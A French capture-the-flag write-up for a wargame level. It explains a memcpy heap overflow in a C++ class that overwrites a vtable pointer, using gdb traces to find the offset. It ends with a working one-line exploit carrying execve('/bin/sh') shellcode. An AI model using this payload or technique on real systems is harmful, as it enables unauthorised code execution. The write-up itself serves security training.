## Level9

#### Déroulement du programme:

On a une classe `N`, qui contient quelques fonctions, un entier et un pointeur vers une chaîne de caractères.  Le fonction `N::setAnnotation(char *s)` prend une chaîne en paramètre et la `memcpy` dans la string de son instance.

##### `main()`:

Le main fait un check du nombre d'arguments, et exit si aucun n'est présent. Deux instance de `N` y sont crées, toutes deux avec `new`.

Ensuite, `N::setAnnotation()` est appelé sur la deuxième instance.

##### `N::setAnnotation()`:

```c++

void setAnnotation(char *str) {
    memcpy(annotation, str, strlen(str));
}
```

Cette fonction copie la string passe en paramètre dans la str de l'instance. On voit déjà une faille ici, `memcpy` peut overflow.   

##### `main()`:

Retour a `main`. Sur `gdb`, on voit un jeu de pointeurs jusqu’à un `call %edx` .

Au moment du `call %edx`, on voit que c'est l'`operator+` de la deuxième instance de `N` qui est appelle, avec la première en paramètre:

```asm
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
=> 0x0804867c <+136>:	mov    0x10(%esp),%eax 
   0x08048680 <+140>:	mov    (%eax),%eax
   0x08048682 <+142>:	mov    (%eax),%edx; (note: segfault ici.)
	;$edx : 0x804873a <_ZN1NplERS_>:	0x8be58955  (soit N::operator+(N&)) 
   0x08048684 <+144>:	mov    0x14(%esp),%eax 
   0x08048688 <+148>:	mov    %eax,0x4(%esp)
   ;L'autre instance est mise en parametre.
   0x0804868c <+152>:	mov    0x10(%esp),%eax
   0x08048690 <+156>:	mov    %eax,(%esp)
   0x08048693 <+159>:	call   *%edx
```

Après le call a `N::setAnnotation()`, avec `./level9 AAAA`:

```
(gdb) x $eax
0x804a00c:	0x41414141
```

On a l'adresse de notre buffer: `0x804a00c`

Avec un pattern-generator, on peut se convaincre que le programme segfault a partir de **108** **caractères**. 

Après les 108 octets, on peut voir l'adresse sur laquelle le call se fera plus tard:

```
(gdb) x $eax
0x804a00c:	0x42424242
(gdb) x $eax + 108
0x804a078:	0x08048848
(gdb) x 0x08048848
0x8048848 <_ZTV1N+8>:	0x0804873a
(gdb) info symbol 0x804873a
N::operator+(N&) in section .text of /home/user/level9/level9
```

*On note bien qu'il faut déréférencer l'adresse pour accéder a la fonction* 

C'est donc très simple d'imaginer comment ré-écrire une valeur de notre choix a la place.

#### Objectif:

On va faire overflow `memcpy`, et écrire l'adresse de l'adresse d'un shell code a exécuter. On aura donc:

```
[[ 4  ][           28            ][               76                ][ 4  ]]
[[addr][.........shellcode.......][.............padding.............][addr]]
  ^^^^ Adresse du shellcode                         Adresse du buffer ^^^^
       (0x804a00c + 4)                              (0x804a00c)
```

Ce qui nous donne :

`./level9 $(python -c 'print("\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90" * 76 + "\x0c\xa0\x04\x08")')`



